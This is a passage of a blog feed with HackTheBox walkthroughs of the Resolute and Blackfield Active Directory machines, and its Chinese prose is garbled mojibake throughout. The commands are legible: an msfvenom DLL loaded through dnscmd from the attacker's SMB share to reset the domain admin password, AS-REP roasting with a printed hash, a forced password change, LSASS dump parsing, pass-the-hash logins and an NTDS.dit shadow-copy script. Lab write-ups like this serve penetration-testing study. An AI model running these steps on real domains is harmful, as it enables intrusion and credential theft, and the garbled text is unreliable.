alt="image-20240712162933792"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712163206748-1443376353.png" alt="image-20240712163205922"></p><p>åœ¨<code>Desktop</code>ä¸Šæ‰¾åˆ°<code>user.txt</code></p><h1 id="ADåŸŸææƒ"><a href="#ADåŸŸææƒ" class="headerlink" title="ADåŸŸææƒ"></a>ADåŸŸææƒ</h1><h2 id="BloodHoundä¿¡æ¯æœé›†"><a href="#BloodHoundä¿¡æ¯æœé›†" class="headerlink" title="BloodHoundä¿¡æ¯æœé›†"></a>BloodHoundä¿¡æ¯æœé›†</h2><p>å°†<code>SharpHound.exe</code>ä¼ ä¸Šå»è¿è¡Œ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712175809715-202073680.png" alt="image-20240712175808679"></p><p>å°†ç»“æœ<code>zip</code>ä¸‹è½½ä¸‹æ¥ï¼Œæ‹¿<code>bloodhoun</code>åˆ†æ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181220147-1222680155.png" alt="image-20240712181218798"></p><p>ç‚¹å‡»<code>Find Shortest Paths to Domain Admins</code>åï¼Œå‘ç°å½“å‰ç”¨æˆ·æ²¡æœ‰ä»€ä¹ˆæ˜æ˜¾åˆ©ç”¨çš„ç‚¹ï¼Œä½†æ˜¯å‘ç°åœ¨è¿™ä¸ªåŸŸä¸­è¿˜æœ‰ä¸€ä¸ª<code>ryan</code>ç”¨æˆ·ï¼Œä½†æ˜¯ä¸çŸ¥é“å¯†ç ï¼Œåªèƒ½ä»å½“å‰<code>melanie</code>ç”¨æˆ·å…¥æ‰‹äº†</p><h2 id="æŸ¥çœ‹Powershellæ—¥å¿—æ–‡ä»¶è·å¾—ç”¨æˆ·åå¯†ç "><a href="#æŸ¥çœ‹Powershellæ—¥å¿—æ–‡ä»¶è·å¾—ç”¨æˆ·åå¯†ç " class="headerlink" title="æŸ¥çœ‹Powershellæ—¥å¿—æ–‡ä»¶è·å¾—ç”¨æˆ·åå¯†ç "></a>æŸ¥çœ‹Powershellæ—¥å¿—æ–‡ä»¶è·å¾—ç”¨æˆ·åå¯†ç </h2><p>æŸ¥æ‰¾å¯ç–‘æ–‡ä»¶æ—¶ï¼Œåœ¨<code>C:/</code>ç›®å½•ä¸‹è¿è¡Œ<code>ls -force</code>å‘½ä»¤åå‘ç°å¦‚ä¸‹ç»“æœï¼š<br><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181552664-103691626.png" alt="image-20240712181551586"></p><p>å…¶ä¸­<code>PSTranscripts</code>æœ‰ç‚¹å¯ç–‘ï¼Œè¯¥è‹±æ–‡ç›´è¯‘æ˜¯<code>PSä¼ è¾“è„šæœ¬</code>ï¼Œä»”ç»†æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç›®å½•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182039819-759817632.png" alt="image-20240712182037742"></p><p>åœ¨<code>C:\PSTranscripts\20191203</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code>æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯èƒ½æ˜¯<code>Powershell</code>çš„æ—¥å¿—ä¹‹ç±»çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182643667-1606404044.png" alt="image-20240712182642485"></p><p>è¿™é‡Œè²Œä¼¼æ˜¯<code>ryan</code>ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå°è¯•ç™»é™†ä¸‹</p><p><code>evil-winrm -i 10.10.10.169 -u ryan -p &#39;Serv3r4Admin4cc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182823693-1043454332.png" alt="image-20240712182822459"></p><p>ç™»å½•æˆåŠŸ</p><h2 id="åˆ©ç”¨DnsAdminsææƒ"><a href="#åˆ©ç”¨DnsAdminsææƒ" class="headerlink" title="åˆ©ç”¨DnsAdminsææƒ"></a>åˆ©ç”¨DnsAdminsææƒ</h2><p>åœ¨æ¡Œé¢å‘ç°<code>note.txt</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712183132981-1610553881.png" alt="image-20240712183131938"></p><p>ç¿»è¯‘è¿‡æ¥å°±æ˜¯</p><blockquote><p>å‘é€ç»™å›¢é˜Ÿçš„ç”µå­é‚®ä»¶ï¼š</p><p>- ç”±äºæ›´æ”¹å†»ç»“ï¼Œä»»ä½•ç³»ç»Ÿæ›´æ”¹ï¼ˆé™¤äº†å¯¹ç®¡ç†å‘˜å¸æˆ·çš„æ›´æ”¹ï¼‰éƒ½å°†åœ¨1åˆ†é’Ÿå†…è‡ªåŠ¨æ¢å¤</p></blockquote><p>åœ¨æŸ¥çœ‹<code>bloodhound</code>çš„è¿‡ç¨‹ä¸­å‘ç°ä¸‹é¢æƒ…å†µï¼š</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191138799-215220281.png" alt="image-20240712191130338"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191145783-1038194011.png" alt="image-20240712191143991"></p><p>å‘ç°<code>ryan</code>ç”¨æˆ·å±äº<code>contractors</code>ç»„ï¼Œè€Œ<code>contractors</code>ç»„åˆå±äº<code>dnsadmins</code>ç»„ï¼Œæ‰€ä»¥<code>ryan</code>ç”¨æˆ·å±äº<code>dnsadmins</code>ç»„</p><p>å°±å¯ä»¥åˆ©ç”¨ <code>DnsAdmins</code>æƒé™è¿›è¡Œ<code>AD</code>åŸŸææƒ</p><blockquote><p><code>DNSAdmins</code>ç»„çš„æˆå‘˜å¯ä»¥è®¿é—®ç½‘ç»œ <code>DNS</code> ä¿¡æ¯ã€‚é»˜è®¤æƒé™å¦‚ä¸‹ï¼š å…è®¸ï¼šè¯»å–ã€å†™å…¥ã€åˆ›å»ºæ‰€æœ‰å­å¯¹è±¡ã€åˆ é™¤å­å¯¹è±¡ã€ç‰¹æ®Šæƒé™ã€‚</p><p>dnsadmins ç»„çš„æˆå‘˜å¯ç”¨äºé€šè¿‡ <code>dll</code> æ³¨å…¥å°†æƒé™æå‡åˆ°ç®¡ç†å‘˜ã€‚</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">å‚è€ƒé“¾æ¥</a></p></blockquote><p>é¦–å…ˆä½¿ç”¨<code>msf</code>ç”Ÿæˆ<code>dll</code>æ–‡ä»¶ï¼Œå°†<code>dll</code>æ–‡ä»¶ä¼ åˆ°æœºå™¨ä¸Š</p><p><code>msfvenom -p windows/x64/exec cmd=&#39;net user administrator abc123! /domain&#39; -f dll &gt; evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143409907-1507824470.png" alt="image-20240714143407217"></p><p>å› ä¸ºæ­£å¸¸<code>upload</code>ä¼ æ–‡ä»¶ä¼šè¢«æ€æ‰ï¼Œè¿™é‡Œè€ƒè™‘ä½¿ç”¨<code>smb</code>ä¼ æ–‡ä»¶</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714134946085-1345920374.png" alt="image-20240714134943265"></p><p>åœ¨é¶æœºä¸Šçš„<code>ps</code>é‡Œå¤´æ‰§è¡Œ</p><p><code>cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.28\share\evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714135422509-753045836.png" alt="image-20240714135419626"></p><p>æ¥ç€æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤é‡å¯<code>dns</code>æœåŠ¡</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop dns</span><br><span class="line">sc.exe <span class="built_in">start</span> dns</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140456936-991048758.png" alt="image-20240714140453914"></p><p>æ­¤æ—¶ï¼Œä¹‹å‰åˆ©ç”¨<code>python</code>èµ·çš„<code>smbserver</code>æœåŠ¡ä¼šæ”¶åˆ°å›æ˜¾</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140731885-1692805194.png" alt="image-20240714140729094"></p><p>æœ€ååˆ©ç”¨<code>psexec.py</code>ç™»å½•ï¼Œè¾“å…¥å¯†ç </p><p><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py megabank.local/administrator@10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143554332-1195939730.png" alt="image-20240714143551441"></p><p>æœ€ååœ¨<code>Administrator</code>çš„<code>Desktop</code>æ‰¾åˆ°<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714144241216-9787929.png" alt="image-20240714144237322"></p>]]></content>
    
    
    <summary type="html">HackTheBoxç¯‡åŸŸæ¸—é€ç³»åˆ—ä¹‹Resolute</summary>
    
    
    
    <category term="HackTheBox" scheme="https://www.fomal.cc/categories/HackTheBox/"/>
    
    
    <category term="HTB" scheme="https://www.fomal.cc/tags/HTB/"/>
    
    <category term="åŸŸæ¸—é€" scheme="https://www.fomal.cc/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Blackfield</title>
    <link href="https://www.fomal.cc/posts/82db38f4.html"/>
    <id>https://www.fomal.cc/posts/82db38f4.html</id>
    <published>2024-07-09T11:30:53.000Z</published>
    <updated>2024-10-06T08:25:03.700Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>é¶æœºipï¼š10.10.10.192</p><p>æ”»å‡»æœºipï¼š10.10.14.12</p></blockquote><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li>AS-REP Roasting</li><li>Pythonç‰ˆBloodhoundä½¿ç”¨</li><li>ForceChangePasswordæƒé™æ»¥ç”¨å®ç°æ¨ªå‘ç§»åŠ¨</li><li>åˆ©ç”¨Lsasså†…å­˜æ•è·æ–‡ä»¶æå–ç”¨æˆ·hash</li><li>åˆ©ç”¨SeBackupPrivilegeæƒé™è¿›è¡ŒNTDS.ditå·å½±æ‹·è´å®ç°æƒé™æå‡</li><li>ä½¿ç”¨wmiexecè¿›è¡ŒPTH</li></ul><h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="nmapæ‰«æ"><a href="#nmapæ‰«æ" class="headerlink" title="nmapæ‰«æ"></a>nmapæ‰«æ</h2><p><code>nmap -sS -sV -sC 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709112314494-548401534.png" alt="image-20240709112312857"></p><p>æœ‰<code>DNS</code>æœåŠ¡ï¼Œ<code>kerberos</code>æœåŠ¡ï¼Œ<code>LDAP</code>æœåŠ¡ï¼Œ<code>SMB</code>æœåŠ¡ï¼ŒåŸŸå<code>BLACKFIELD.local</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>ç›´æ¥å°è¯•ä¸€æ‰‹åŒ¿åç™»å½•</p><p><code>smbclient -L \\10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710104225686-281558305.png" alt="image-20240710104224727"></p><p>å‘ç°å¾—åˆ°ä¸€äº›å…±äº«èµ„æºï¼Œå°è¯•è·å–<code>profiles$</code>èµ„æº</p><p><code>smbclient //10.10.10.192/profiles$</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710111357853-1171589590.png" alt="image-20240710111356614"></p><p>å‘ç°ä¸€äº›ä½¿ç”¨è€…çš„åç§°ï¼Œå°†æ¯æ¡å¸¦åå­—çš„æ•°æ®ä¿å­˜åˆ°<code>users.txt</code>ä¸­ï¼Œå†™ä¸ªè„šæœ¬å°†å…¶ä¿å­˜åˆ°<code>user.txt</code>ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æå–å§“åéƒ¨åˆ†</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^\s*(\S+)&#x27;</span>, re.MULTILINE)</span><br><span class="line">names = pattern.findall(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æå–çš„å§“åä¿å­˜åˆ°æ–°æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        output_file.write(name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æå–çš„æ•°æ®å·²ä¿å­˜åˆ° &#x27;user.txt&#x27; æ–‡ä»¶ä¸­ã€‚&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è·å¾—äº†ä¸€ä¸ªåŸºæœ¬çš„ç”¨æˆ·åˆ—è¡¨</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>åˆ©ç”¨<code>ldapsearch</code>æœç´¢</p><p><code>ldapsearch -H ldap://10.10.10.192:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710113255598-1728367252.png" alt="image-20240710113254757"></p><p>å¾—åˆ°ä¸¤ä¸ªåŸŸå</p><blockquote><p><code>DomainDnsZones.blackfield.local</code></p><p><code>ForestDnsZones.blackfield.local</code></p></blockquote><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>æ‹¿åˆ°äº†ç”¨æˆ·åï¼Œè¿™é‡Œåˆæš´éœ²äº†<code>kerberos</code>ç«¯å£88ã€‚å°è¯•ä¸€ä¸‹<code>AS-REP Roasting</code>æ”»å‡»</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt  -dc-ip 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114412279-965573907.png" alt="image-20240710114411468"></p><p>æ‹¿åˆ°ä¸€ä¸ª<code>support</code>ç”¨æˆ·çš„<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:8e8fcfa24b77dd8ed4e22771a99640c3$937ed6b20ebfcdbc0a07e975d271f8a18d88e0dfc6b774da9184de540c6847c9adeb2b5615a2f99e06235064c420c621ae3b2bc0cf78ebe3047b7004d1dcfac74bc582fc68c3fa0cf0244920cfceab53cee3e91fc049bbef7efa1584041389ae19d317ab6bfb5c0df0eb4703fbe66367f12999d756d9400e971ab0b6d8993c267a606359303d2f4dfc54ae40b819c613e8e6281a91cec5d22aef09304a696cb9b43a4555ce0dbfe860a16bb83ea715eceabee93327ad337799f0f5153e91e924df1624e3458201312cd6a4bc1d4999dd9b0cc2a4ea3406f78836240ef70c1982911fd13e8f45c3c4f36c28781133df608f33d801</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>john</code>è¿›è¡Œç ´è§£</p><p>å°†ä¸Šè¿°ç¥¨æ®ä¿å­˜ä¸º<code>hash</code>ï¼Œä½¿ç”¨<code>john</code>çˆ†ç ´<code>hash</code>å€¼</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114627581-651420839.png" alt="image-20240710114626394"></p><p>æ‹¿åˆ°ç”¨æˆ·åå¯†ç ï¼š<code>support : #00^BlackKnight</code></p><p>ä½†æ˜¯<code>evil-winrm</code>ç™»é™†ä¸äº†ï¼Œæ— æ³•é€šè¿‡<code>BloodHound.exe</code>è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨<code>Python</code>ç‰ˆçš„<code>BloodHound</code>ä¿¡æ¯æ”¶é›†ï¼Œå®ç°äº†ä¸éœ€è¦ç™»å½•å³å¯å®Œæˆä¿¡æ¯æ”¶é›†çš„åŠŸèƒ½</p><h1 id="ADåŸŸæ¸—é€"><a href="#ADåŸŸæ¸—é€" class="headerlink" title="ADåŸŸæ¸—é€"></a>ADåŸŸæ¸—é€</h1><h2 id="Pythonç‰ˆBloodhound-ä¿¡æ¯æœé›†"><a href="#Pythonç‰ˆBloodhound-ä¿¡æ¯æœé›†" class="headerlink" title="Pythonç‰ˆBloodhound-ä¿¡æ¯æœé›†"></a>Pythonç‰ˆBloodhound-ä¿¡æ¯æœé›†</h2><p>ä½¿ç”¨ä¹‹å‰è·å¾—çš„ç”¨æˆ·å’Œå¯†ç ï¼Œé€šè¿‡<code>bloodhound</code>è¿›è¡Œä¿¡æ¯æœé›†</p><p><code>bloodhound-python -c all -u support -p &#39;#00^BlackKnight&#39; -d blackfield.local -ns 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150153628-249598852.png" alt="image-20240710150152607"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150205848-1098348644.png" alt="image-20240710150201795"></p><p>å¾—åˆ°ä¸€äº›æ–‡ä»¶ï¼Œå¯¼å…¥<code>bloodhound</code>åˆ†æ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710152322259-467189056.png" alt="image-20240710152321163"></p><p>ç‚¹å‡»<code>First Degree Object Control</code>å¯ä»¥å‘ç°<code>support</code>ç”¨æˆ·ä¸<code>audit2020</code>ç”¨æˆ·æœ‰<code>ForceChangePassword</code>å…³ç³»</p><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯<code>support</code>ç”¨æˆ·å¯ä»¥ä¿®æ”¹<code>audit2020</code>ç”¨æˆ·çš„å¯†ç </p><h2 id="ForceChangePasswordæƒé™æ»¥ç”¨å®ç°æ¨ªå‘ç§»åŠ¨"><a href="#ForceChangePasswordæƒé™æ»¥ç”¨å®ç°æ¨ªå‘ç§»åŠ¨" class="headerlink" title="ForceChangePasswordæƒé™æ»¥ç”¨å®ç°æ¨ªå‘ç§»åŠ¨"></a>ForceChangePasswordæƒé™æ»¥ç”¨å®ç°æ¨ªå‘ç§»åŠ¨</h2><p>å°è¯•åˆ©ç”¨<code>rpcclient</code>ä¿®æ”¹<code>audit2020</code>ç”¨æˆ·çš„å¯†ç </p><p><code>rpcclient -U support --password=&#39;#00^BlackKnight&#39; //10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710153321856-686397598.png" alt="image-20240710153321021"></p><p>ä¿®æ”¹å¯†ç </p><p><code>setuserinfo2 audit2020 23 &#39;test&#39;</code> </p><p>å…¶ä¸­<code>23</code>è¡¨ç¤ºç”¨æˆ·ä¿¡æ¯çº§åˆ«ä¸ºè®¾ç½®ç”¨æˆ·å¯†ç çš„çº§åˆ«</p><p>å½“è®¾ç½®çš„æ–°å¯†ç ä¸å¯†ç ç­–ç•¥ä¸åŒ¹é…æ—¶ä¼šè¿”å›ï¼Œè®¾ç½®ä¸€ä¸ªå¤æ‚åº¦æ¯”è¾ƒé«˜çš„å¯†ç </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154020510-5395533.png" alt="image-20240710154019443"></p><p><code>setuserinfo2 audit2020 23 &#39;abc123!&#39;</code> </p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154643225-1445876917.png" alt="image-20240710154642384"></p><p>åˆ©ç”¨<code>crackmapexec</code>éªŒè¯ä¸€ä¸‹</p><p><code>crackmapexec smb 10.10.10.192 -u audit2020 -p &#39;abc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710154816714-1157833350.png" alt="image-20240710154815763"></p><p>å°è¯•é€šè¿‡<code>audit2020</code>ç”¨æˆ·å»è·å¾—æ›´å¤š<code>smb</code>å…±äº«ç›®å½•</p><p><code>smbmap -H 10.10.10.192 -u audit2020 -p &#39;abc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710155251724-1886584129.png" alt="image-20240710155250411"></p><p>å‘ç°è·å¾—äº†<code>forensic</code>ç›®å½•çš„è®¿é—®æƒé™</p><p><code>smbclient -U audit2020%&#39;abc123!&#39; //10.10.10.192/forensic</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170746090-1201307298.png" alt="image-20240710170745364"></p><p>åœ¨<code>\commands_output\</code>ç›®å½•ä¸‹æ‰¾åˆ°<code>domain_admins.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710170914171-1511595285.png" alt="image-20240710170913100"></p><p>å°†å…¶<code>get</code>ä¸‹æ¥æŸ¥çœ‹</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710171000940-1172109387.png" alt="image-20240710171000020"></p><p>å‘ç°ç–‘ä¼¼<code>admin</code>å¯†ç </p><h2 id="åˆ©ç”¨Lsasså†…å­˜æ•è·æ–‡ä»¶æå–ç”¨æˆ·hash"><a href="#åˆ©ç”¨Lsasså†…å­˜æ•è·æ–‡ä»¶æå–ç”¨æˆ·hash" class="headerlink" title="åˆ©ç”¨Lsasså†…å­˜æ•è·æ–‡ä»¶æå–ç”¨æˆ·hash"></a>åˆ©ç”¨Lsasså†…å­˜æ•è·æ–‡ä»¶æå–ç”¨æˆ·hash</h2><p>åœ¨<code>\memory_analysis\</code>ç›®å½•ä¸‹å‘ç° <code>lsass.zip</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710192250343-879219788.png" alt="image-20240710192247820"></p><p>è¯¥æ–‡ä»¶å¯èƒ½æ˜¯å¯¹<code>LSASS</code>è¿›ç¨‹è¿›è¡Œäº†å†…å­˜æ•è·çš„ç»“æœï¼Œ<code>LSASS</code>æ˜¯<code>Windows</code>ä¸­å¤„ç†èº«ä»½éªŒè¯å’Œå®‰å…¨ç­–ç•¥çš„ç³»ç»ŸæœåŠ¡ã€‚å…¶å†…å­˜ç©ºé—´ä¸­ä¿å­˜ç€å„ç§èº«ä»½éªŒè¯çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å°†è¯¥æ–‡ä»¶ä¸‹è½½å¹¶è§£å‹ã€‚</p><p><code>smbclient -U audit2020%&#39;abc123!&#39; //10.10.10.192/forensic -t 1000</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710203532417-712881982.png" alt="image-20240710203530888"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711113908563-1043657612.png" alt="image-20240711113903638"></p><p>å¾—åˆ°ä¸€ä¸ª<code>lsass.DMP</code>æ–‡ä»¶</p><p>ä½¿ç”¨<code>mimikatz</code>å·¥å…·ä»å†…å­˜è½¬å‚¨ä¸­å°è¯•æå–ç”¨æˆ·çš„<code>hash</code>ï¼Œåœ¨<code>Linux</code>ä¸­ä½¿ç”¨<code>Python</code>ç‰ˆçš„<code>Mimikatz</code>â€”â€”<code>pypykatz</code></p><p><code>pypykatz lsa minidump lsass.DMP</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711140819814-250042491.png" alt="image-20240711140816038"></p><p>æ‰¾åˆ°<code>svc_backup</code>ç”¨æˆ·çš„<code>hash</code>ï¼š<code>9658d1d1dcd9250115e2205d9f48400d</code></p><p>å…ˆå°è¯•åˆ©ç”¨<code>svc_backup</code>ç”¨æˆ·ååŠå…¶<code>hash</code>è¿œç¨‹ç™»å½•</p><p><code>evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711143617732-359613996.png" alt="image-20240711143614075"></p><p>åœ¨<code>Desktop</code>æ‰¾åˆ°<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711150000424-813557009.png" alt="image-20240711145956639"></p><h2 id="åˆ©ç”¨SeBackupPrivilegeæƒé™è¿›è¡ŒNTDS-ditå·å½±æ‹·è´å®ç°æƒé™æå‡"><a href="#åˆ©ç”¨SeBackupPrivilegeæƒé™è¿›è¡ŒNTDS-ditå·å½±æ‹·è´å®ç°æƒé™æå‡" class="headerlink" title="åˆ©ç”¨SeBackupPrivilegeæƒé™è¿›è¡ŒNTDS.ditå·å½±æ‹·è´å®ç°æƒé™æå‡"></a>åˆ©ç”¨SeBackupPrivilegeæƒé™è¿›è¡ŒNTDS.ditå·å½±æ‹·è´å®ç°æƒé™æå‡</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711164410787-733913997.png" alt="image-20240711164407072"></p><p>åœ¨ä¹‹å‰çš„<code>bloodhound</code>ä¿¡æ¯æœé›†ä¸­æœç´¢<code>svc_backup</code>ï¼Œç‚¹å‡»<code>First Degree Group Memberships</code>å‘ç°è¯¥ç”¨æˆ·å±äº<code>backup_operators</code>ç»„çš„æˆå‘˜</p><p>æ‹¥æœ‰è¿™ä¸ªç»„æƒé™çš„äººå¯ä»¥é€šè¿‡<code>SEBackupPrivilege</code>æƒé™è¿›è¡Œææƒï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œç¡®è®¤æ˜¯å¦å…·æœ‰è¯¥æƒé™ï¼š</p><p><code>whoami /priv</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711170127115-1738419937.png" alt="image-20240711170123369"></p><p>å‘ç°æˆ‘ä»¬æœ‰<code>SeBackupPrivilege</code>æƒé™ï¼Œå°±å¯ä»¥é€šè¿‡ä½¿ç”¨ç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶åˆ›å»º <code>NTDS.dit</code> çš„å·å½±å‰¯æœ¬æ¥å®Œæˆ<code>diskshadow</code></p><p>é¦–å…ˆä¸Šä¼ å¹¶å¯¼å…¥<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>æä¾›çš„ä¸¤ä¸ª<code>dll</code>æ–‡ä»¶</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeCmdLets.dll </span><br><span class="line"></span><br><span class="line">upload /root/htb/Machines/Blackfield/SeBackupPrivilegeUtils.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line"></span><br><span class="line">Import-Module .\SeBackupPrivilegeUtils.dll</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202225639-2048106759.png" alt="image-20240711202221083"></p><p>æ¥ç€å†™å…¥æ–‡ä»¶å¹¶é€šè¿‡<code>upload</code>ä¸Šä¼ </p><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">å‚è€ƒé“¾æ¥</a></p><p>ä½†æ˜¯è¿™é‡Œè¦åŠ ä¸€è¡Œæ¥æŒ‡å®šå…ƒæ•°æ®æ–‡ä»¶çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # æ·»åŠ çš„éƒ¨åˆ†</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240711202619203-1966588599.png" 